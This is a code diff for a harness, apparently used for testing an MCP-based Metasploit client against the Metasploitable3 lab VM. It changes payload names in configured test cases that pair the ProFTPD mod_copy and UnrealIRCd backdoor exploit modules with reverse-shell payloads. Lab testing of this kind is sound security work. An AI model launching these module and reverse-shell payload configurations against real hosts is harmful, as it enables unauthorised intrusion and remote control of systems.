@@ -168,7 +168,7 @@ class MetasploitMCPClient:
         Args:
             module_name: Metasploit module path (e.g., "exploit/unix/ftp/proftpd_modcopy_exec")
             options: Module options (RHOSTS, RPORT, etc. - NOT including LHOST/LPORT)
-            payload_name: Payload to use (e.g., "cmd/unix/reverse_perl")
+            payload_name: Payload to use (e.g., "payload/unix/reverse_perl" or "unix/reverse_perl")
             payload_options: Payload options (LHOST, LPORT, etc.)
             run_as_job: If True, run as background job; if False, run via console (default: False)
             
@@ -422,7 +422,7 @@ class Metasploitable3TestHarness:
                 name="ProFTPD ModCopy Exec",
                 description="ProFTPD 1.3.5 Mod_Copy Command Execution",
                 module="exploit/unix/ftp/proftpd_modcopy_exec",
-                payload="cmd/unix/reverse_perl",
+                payload="unix/reverse_perl",
                 options={
                     "RHOSTS": self.target_ip,
                     "RPORT": "80",
@@ -505,7 +505,7 @@ class Metasploitable3TestHarness:
                 name="UnrealIRCd Backdoor",
                 description="UnrealIRCd 3.2.8.1 Backdoor Command Execution",
                 module="exploit/unix/irc/unreal_ircd_3281_backdoor",
-                payload="cmd/unix/reverse",
+                payload="unix/reverse",
                 options={
                     "RHOSTS": self.target_ip,
                     "RPORT": "6697",
